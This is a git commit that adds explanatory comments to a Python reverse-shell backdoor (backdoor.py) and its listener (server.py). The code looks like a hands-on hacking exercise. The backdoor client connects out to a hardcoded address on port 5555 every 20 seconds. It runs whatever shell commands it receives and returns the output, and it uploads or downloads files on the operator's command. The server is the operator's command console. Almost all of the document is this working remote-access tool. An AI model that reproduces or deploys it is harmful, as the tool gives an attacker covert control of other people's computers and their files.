83c483ac94dc403e7fc14c5393006c378df80116
Tomas Bernatonis <tbernatonis8@gmail.com>
2023-08-20 12:08:45 -0400

    adjusted the code with comments for better comprehension of the code

--- backdoor.py
+++ backdoor.py
@@ -4,37 +4,42 @@ import subprocess
 import json
 import os
 
+# Function to send data reliably by encoding it as JSON
 def reliable_send(data):
     json_data = json.dumps(data)
     s.send(json_data.encode())
 
+# Function to receive data reliably by continuously trying until successful
 def reliable_receive():
     data = ''
     while True:
         try:
-            data = data+ s.recv(1024).decode().rstrip()
+            data = data + s.recv(1024).decode().rstrip()
             return json.loads(data)
         except ValueError:
             continue
 
+# Function to establish the initial connection
 def connection():
     while True:
-        time.sleep(20)
+        time.sleep(20)  # Wait for a while before attempting to reconnect
         try:
-            s.connect(('192.168.0.4', 5555))
-            shell()
-            s.close()
+            s.connect(('192.168.0.4', 5555))  # Connect to the specified address and port
+            shell()  # Start the interactive shell
+            s.close()  # Close the connection
             break
         except:
-            connection()
+            connection()  # Retry the connection if an error occurs
 
+# Function to upload a file to the connected server
 def upload_file(file_name):
     f = open(file_name, 'rb')
     s.send(f.read())
     
+# Function to download a file from the connected server
 def download_file(file_name):
     f = open(file_name, 'wb')
-    s.settimeout(1)
+    s.settimeout(1)  # Set a timeout for receiving data
     chunk = s.recv(1024)
     while chunk:
         f.write(chunk)
@@ -42,28 +47,32 @@ def download_file(file_name):
             chunk = s.recv(1024)
         except socket.timeout as e:
             break
-    s.settimeout(None)
+    s.settimeout(None)  # Reset the timeout
     f.close()
 
+# Main shell function to interact with the server
 def shell():
     while True:
-        command = reliable_receive()
+        command = reliable_receive()  # Receive a command from the server
         if command == 'exit':
-            break
+            break  # Exit the loop if the command is 'exit'
         elif command == 'clear':
-            pass
+            pass  # Placeholder for clearing the console (not implemented)
         elif command[:3] == 'cd ':
-            os.chdir(command[3:])
+            os.chdir(command[3:])  # Change the current working directory
         elif command[:8] == 'download':
-            upload_file(command[9:])
+            upload_file(command[9:])  # Upload a file to the server
         elif command[:6] == 'upload':
-            download_file(command[7:])
+            download_file(command[7:])  # Download a file from the server
         else:
+            # Execute the command using subprocess and send back the result
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = execute.stdout.read() + execute.stderr.read()
             result = result.decode()
-            reliable_send(result)
+            reliable_send(result)  # Send the result back to the server
         
-        
+# Create a socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# Start the connection process
 connection()
--- server.py
+++ server.py
@@ -2,23 +2,27 @@ import socket
 import json
 import os
 
+# Function to send data reliably by encoding as JSON and sending over the socket
 def reliable_send(data):
     json_data = json.dumps(data)
     target.send(json_data.encode())
 
+# Function to receive data reliably by continuously receiving and decoding data until a valid JSON is obtained
 def reliable_receive():
     data = ''
     while True:
         try:
-            data = data+ target.recv(1024).decode().rstrip()
+            data = data + target.recv(1024).decode().rstrip()
             return json.loads(data)
         except ValueError:
             continue
-        
+
+# Function to upload a file to the target by reading the file in binary mode and sending its contents over the socket
 def upload_file(file_name):
     f = open(file_name, 'rb')
     target.send(f.read())
-    
+
+# Function to download a file from the target by receiving chunks of data and writing them to a file
 def download_file(file_name):
     f = open(file_name, 'wb')
     target.settimeout(1)
@@ -32,30 +36,38 @@ def download_file(file_name):
     target.settimeout(None)
     f.close()
 
+# Function to manage communication with the target
 def target_communication():
     while True:
-        data = input('* Shell~%s: ' % str(ip))
-        reliable_send(data)
+        data = input('* Shell~%s: ' % str(ip))  # Take user input
+        reliable_send(data)  # Send input to the target
         if data == 'exit':
             break
         elif data == 'clear':
-            os.system('clear')
+            os.system('clear')  # Clear the console screen
         elif data[:3] == 'cd ':
-            pass
+            pass  # Placeholder for handling changing directories on the target
         elif data[:8] == 'download':
-            download_file(data[9:])
+            download_file(data[9:])  # Download a file from the target
         elif data[:6] == 'upload':
-            download_file(data[7:])
+            download_file(data[7:])  # Upload a file to the target
         else:
-            result = reliable_receive()
+            result = reliable_receive()  # Receive and print result from the target
             print(result)
 
+# Create a socket
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# Bind the socket to a specific IP and port
 sock.bind(('192.168.0.4', 5555))
 
 print('[+] Listening on 192.168.0.4:5555')
+# Start listening for incoming connections
 sock.listen(5)
 
+# Accept an incoming connection and get the target socket and IP
 target, ip = sock.accept()
 print('[+] Accepted connection from %s' % ip)
+
+# Start communication with the target
 target_communication()
